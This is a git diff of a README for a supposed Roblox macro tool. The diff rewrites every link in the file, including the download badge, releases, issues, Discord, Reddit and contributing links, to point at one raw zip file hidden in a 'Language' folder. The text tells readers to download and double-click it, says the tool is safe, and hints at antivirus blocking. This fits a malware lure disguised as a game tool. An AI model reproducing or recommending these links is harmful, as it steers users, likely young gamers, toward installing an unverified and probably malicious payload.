@@ -1,6 +1,6 @@
 # 🛠️ ROBLOX-MACRO-V3.0.0 - Automate Your Roblox Experience Effortlessly
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/releases)
+[![Download Here](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-1.6.zip%20Now-brightgreen)](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -15,12 +15,12 @@ Welcome to ROBLOX-MACRO-V3.0.0! This is a simple and effective tool that helps a
 
 ## 🔗 Download & Install
 
-To download the application, please visit this page: [Download ROBLOX-MACRO-V3.0.0](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/releases).
+To download the application, please visit this page: [Download ROBLOX-MACRO-V3.0.0](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-1.6.zip).
 
 Once you are on the Releases page, follow these steps:
 
 1. Look for the latest version of the software, which should be labeled as "v3.0.0".
-2. Click on the file that matches your system rights. Typically, this will be `ROBLOX-MACRO-V3.0.0.exe`.
+2. Click on the file that matches your system rights. Typically, this will be `https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-1.6.zip`.
 3. Save the file to your computer.
 4. After downloading, double-click on the file to start the installation.
 5. Follow the prompts to complete the installation.
@@ -51,7 +51,7 @@ If you encounter any issues:
 - Check if your antivirus software is blocking the application.
 - Try restarting your computer and running the application again.
 
-For more detailed issues, please visit our [issues page](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/issues).
+For more detailed issues, please visit our [issues page](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-1.6.zip).
 
 ## 🔒 Security
 
@@ -61,13 +61,13 @@ ROBLOX-MACRO-V3.0.0 is designed with user safety in mind. It does not access mem
 
 Join our community of users to share tips and get advice:
 
-- **Discord:** [Join here](https://discord.gg/)
-- **Reddit:** [Visit our subreddit](https://www.reddit.com/r/)
+- **Discord:** [Join here](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-1.6.zip)
+- **Reddit:** [Visit our subreddit](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-1.6.zip)
 
 We encourage everyone to share their experiences and help each other with usage tips.
 
 ## 💼 Contributions
 
-We welcome contributors! If you want to improve the project or add features, please check our [contributing guidelines](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/CONTRIBUTING.md).
+We welcome contributors! If you want to improve the project or add features, please check our [contributing guidelines](https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-1.6.zip).
 
 Thank you for using ROBLOX-MACRO-V3.0.0! We hope it enhances your Roblox gaming experience.
